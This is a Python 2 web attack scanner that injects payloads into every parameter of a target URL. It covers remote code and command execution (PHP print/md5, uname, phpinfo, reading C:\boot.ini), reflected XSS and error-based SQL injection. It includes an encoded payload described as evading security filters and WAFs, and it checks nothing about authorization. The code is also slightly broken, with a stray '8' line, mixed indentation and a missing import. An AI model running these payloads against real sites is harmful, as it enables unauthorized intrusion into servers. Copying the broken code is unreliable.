#!/usr/bin/env python
import urllib
import re
from site_fetch import *                                #importing everything from site_fetch module


def testUrl(url, payloads, check):                           # to split the url and try the append payloads in every parameter value.
        opener = urllib.urlopen(url)
	vulnerbs = 0
        if opener.code == 999:                                 # Detetcing the WebKnight WAF from the StatusCode.
                print color.red +"  WebKnight Web Application Firewall Detected!"+color.end
                print color.red +"  Delaying 3 seconds between every request"+color.end
                time.sleep(3)                                                  #Delaying 3 seconds between every request
        for evry_parameter in url.split("?")[1].split("&"):
            for payload in payloads:
                bugs = url.replace(evry_parameter, evry_parameter + str(payload).strip())               #inserting payload after every parameter

                request = useragent.open(bugs)                                                         #opening the URL with the insserted payload
		html = request.readlines()                                                                      #checking for errors on the resulted web page
                for line in html:
                    checker = re.findall(check, line)                                                   #checking for errors using regex pattern
                    if len(checker) !=0:
                        print color.red+"  Vulnerability Found . . ."+color.end
                        print color.red+"  Payload Injected: " ,payload +color.end
                        print color.green+"  Fault Code Snippet: " +color.end + line.strip()
                        print color.blue+"  Proof of Concept: "+color.end + bugs
                        print color.green+"________________________________________________________________________________"+color.end
                        vulnerbs +=1
        if vulnerbs == 0:
        	print color.green+"  Target is not vulnerable!"+color.end
        else:
        	print color.blue+"    %i Bugs found :-) " % (vulnerbs) +color.end




        #function for vulnerability and detection payloads.

def remoteCodeExec(url):                                                                        #function to detect remote code application
  	print color.bold+"\n  Scanning for Remote Code/Command Execution "+color.end
  	print color.blue+"  Please wait ...."+color.end

  	# Remote Code Injection Payloads
  	payloads = [';${@print(md5(souvik0))}', ';${@print(md5("souvik0"))}']

  	# Below is the Encrypted Payloads to bypass some Security Filters & WAF's
  	payloads += ['%253B%2524%257B%2540print%2528md5%2528%2522souvik0%2522%2529%2529%257D%253B']

  	# Remote Command Execution Payloads
  	payloads += [';uname;', '&&dir', '&&type C:\\boot.ini', ';phpinfo();', ';phpinfo']

  	check = re.compile("51107ed95250b4099a0f481221d56497|Linux|eval\(\)|SERVER_ADDR|Volume.+Serial|\[boot", re.I)           #appending the payload to check  variable
  	testUrl(url, payloads, check)                                                       #calling the test URL function with check parameter




def xssExploit(url):                                                                                        #fn to detect XSS
        print color.bold+"\n  Scanning for XSS vulnerability"+color.end
        print color.blue+"  Please wait ...."+color.end
        8
        #Paylod souvik="css();" added for XSS in <a href TAG's
        payloads = ['%27%3Esouvik0%3Csvg%2Fonload%3Dconfirm%28%2Fsouvik0%2F%29%3Eweb', '%78%22%78%3e%78']               #defining payload for XSS
        payloads += ['%22%3Esouvik0%3Csvg%2Fonload%3Dconfirm%28%2Fsouvik0%2F%29%3Eweb', 'souvik0%3Csvg%2Fonload%3Dconfirm%28%2Fsouvik0%2F%29%3Eweb']    #encoding payload
        check = re.compile('souvik0<svg|x>x', re.I)
        testUrl(url, payloads, check)



def sqliExploit(url):                                                                                                       #fn to detect SQL vulnerabilities
	print color.bold+"\n  Scanning for Error Based SQL Injection "+color.end
	print color.blue+"  Please wait ...."+color.end

    # %5c encoded version of:  \
    # space - %20, ! - %21, ' - %27 , ( - %28, ) - %29
    # reference check - http://www.w3schools.com/TAGS/ref_urlencode.asp
	payloads = ["3'", "3%5c", "3%27%22%28%29", "3'><", "3%22%5C%27%5C%22%29%3B%7C%5D%2A%7B%250d%250a%3C%2500%3E%25bf%2527%27"]
	check = re.compile("Incorrect syntax|Syntax error|Unclosed.+mark|unterminated.+qoute|SQL.+Server|Microsoft.+Database|Fatal.+error", re.I)
	testUrl(url, payloads, check)
